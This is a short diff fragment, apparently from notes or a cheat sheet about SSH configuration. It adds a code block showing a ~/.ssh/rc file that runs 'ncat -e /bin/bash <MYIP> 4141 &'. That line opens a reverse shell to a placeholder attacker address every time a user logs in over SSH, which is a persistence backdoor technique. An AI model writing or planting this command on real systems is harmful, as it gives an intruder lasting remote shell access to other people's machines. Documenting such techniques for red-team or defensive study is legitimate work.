@@ -58,3 +58,8 @@ Hostname *
 
 ```
 
+```
+# cat ~/.ssh/rc
+ncat -e /bin/bash <MYIP> 4141 &
+```
+
